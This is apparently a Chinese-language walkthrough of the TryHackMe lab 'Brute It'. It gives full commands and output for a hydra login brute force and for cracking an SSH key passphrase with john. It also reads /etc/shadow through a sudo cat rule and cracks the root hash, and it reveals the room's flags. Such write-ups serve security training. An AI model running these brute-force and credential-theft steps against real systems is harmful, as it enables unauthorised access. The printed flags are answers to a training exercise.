#服务探测
```
┌──(root💀kali)-[~/tryhackme]
└─# nmap -sV -Pn 10.10.218.99     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 03:18 EDT
Nmap scan report for 10.10.218.99
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.58 seconds
```



#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.218.99

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-10-08_03-18-54.log

Target: http://10.10.218.99

[03:18:55] Starting: 
[03:18:57] 200 -   11KB - /
[03:19:03] 301 -  312B  - /admin  ->  http://10.10.218.99/admin/
[03:25:33] 403 -  277B  - /server-status   
```

/admin源代码有一行注释
>Hey john, if you do not remember, the username is admin

所以我们现在知道登录的账号名是:```admin```，ssh的用户名是：```john```

#用hydra爆破登录密码

```
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.218.99 http-post-form "/admin/:user=admin&pass=^PASS^&submit=LOGIN:Username or password invalid" -I -v
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-08 03:36:32
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.218.99:80/admin/:user=admin&pass=^PASS^&submit=LOGIN:Username or password invalid
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.218.99/admin/panel
[VERBOSE] Page redirected to http://10.10.218.99/admin/panel/
[80][http-post-form] host: 10.10.218.99   login: admin   password: xavier
[STATUS] attack finished for 10.10.218.99 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-08 03:37:31
```

现在我们得到了登录凭证```admin:xavier```

登录后拿到webflag
```THM{brut3_f0rce_is_e4sy}```


把登录页面的rsa复制下来，在本地保存成文件id_rsa

#用ssh2john把rsa改成john能识别的哈希
```
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# locate ssh2john.py                
/usr/share/john/ssh2john.py
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
```

#john开始破解
```
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:04 61.87% (ETA: 03:49:13) 0.2493g/s 2222Kp/s 2222Kc/s 2222KC/s crj316..crizzy19
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2021-10-08 03:49) 0.1336g/s 1917Kp/s 1917Kc/s 1917KC/sa6_123..*7¡Vamos!
Session completed
```

得到rsa密码：```rockinroll```


#登录ssh拿到user.txt
```
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# chmod 600 id_rsa                                                                                                                                                                                                                  130 ⨯
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# ssh -i id_rsa john@10.10.218.99
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  8 07:51:11 UTC 2021

  System load:  0.0                Processes:           104
  Usage of /:   25.8% of 19.56GB   Users logged in:     0
  Memory usage: 24%                IP address for eth0: 10.10.218.99
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}

```

sudo -l查看本账号root权限
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

直接查看shadow文件
```
john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

把```root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.```复制到本地，保存成一个hash.txt文件

再次用john破解
```
┌──(root💀kali)-[~/tryhackme/bruteit]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)
1g 0:00:00:00 DONE (2021-10-08 03:58) 5.555g/s 1422p/s 1422c/s 1422C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

拿到root凭证：```root:football```

#登录root账户，拿到root flag
```
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# cat /root/root.txt 
THM{pr1v1l3g3_3sc4l4t10n}
root@bruteit:/home/john# 
```

#总结
很简单的机器，主要考察各种暴力破解工具的使用。